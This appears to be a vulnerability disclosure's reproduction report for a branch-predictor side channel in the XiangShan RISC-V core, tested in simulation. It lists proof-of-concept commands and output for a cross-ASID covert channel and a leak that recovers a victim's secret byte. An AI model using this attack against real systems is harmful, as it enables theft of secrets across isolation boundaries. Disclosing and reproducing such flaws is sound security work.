# Reproduction Results

## Environment

- OpenXiangShan XiangShan branch: `kunminghu-v3`
- commit: `064f8462a6bfc13994099e2eb70c63fa5f63b85b`
- subject: `feat(ftq): drop resolve when no mispredict (#5759)`
- date: `2026-05-19T10:37:32+08:00`
- generated configuration: `TLMinimalConfig`
- runner type: Cascade vanilla no-trace Verilator runner

## Impact 1: Cross-ASID Covert Channel

Command shape:

```bash
python3 poc/bpu_covert_channel_poc.py \
  --runner /absolute/path/to/Vtop_tiny_soc \
  --message 10 \
  --threshold 10 \
  --train-iters 32 \
  --simlen 60000 \
  --timeout 420
```

Observed result:

```text
RESULT idx=0 sent=1 votes=1 decoded=1
RESULT idx=1 sent=0 votes=0 decoded=0
DECODED=10
MATCH=1
```

Interpretation: ASID A encodes a bit by training or skipping training of a taken
branch.  ASID B decodes the bit by timing a colliding not-taken branch against
an untrained control branch.

## Impact 2: Secret-Dependent Branch Sanity Check

Command shape:

```bash
python3 poc/bpu_branch_leak_poc.py \
  --runner /absolute/path/to/Vtop_tiny_soc \
  --secret-bits 10 \
  --threshold 20 \
  --train-iters 32 \
  --simlen 60000 \
  --timeout 420
```

Observed result:

```text
SECRET_BITS=10
RESULT idx=0 secret=1 votes=1 decoded=1
RESULT idx=1 secret=0 votes=0 decoded=0
DECODED_SECRET=10
MATCH=1
```

## Byte-Level Secret Leak

Command shape:

```bash
python3 poc/bpu_branch_leak_poc.py \
  --runner /absolute/path/to/Vtop_tiny_soc \
  --secret-hex a5 \
  --threshold 20 \
  --train-iters 32 \
  --simlen 60000 \
  --timeout 420
```

Observed result:

```text
SECRET_BITS=10100101
SECRET_HEX=a5
RESULT idx=0 secret=1 votes=1 decoded=1
RESULT idx=1 secret=0 votes=0 decoded=0
RESULT idx=2 secret=1 votes=1 decoded=1
RESULT idx=3 secret=0 votes=0 decoded=0
RESULT idx=4 secret=0 votes=0 decoded=0
RESULT idx=5 secret=1 votes=1 decoded=1
RESULT idx=6 secret=0 votes=0 decoded=0
RESULT idx=7 secret=1 votes=1 decoded=1
DECODED_SECRET=10100101
DECODED_HEX=a5
MATCH=1
```

Interpretation: the attacker recovers the complete byte `0xa5` from victim
secret-dependent branch behavior across ASIDs.
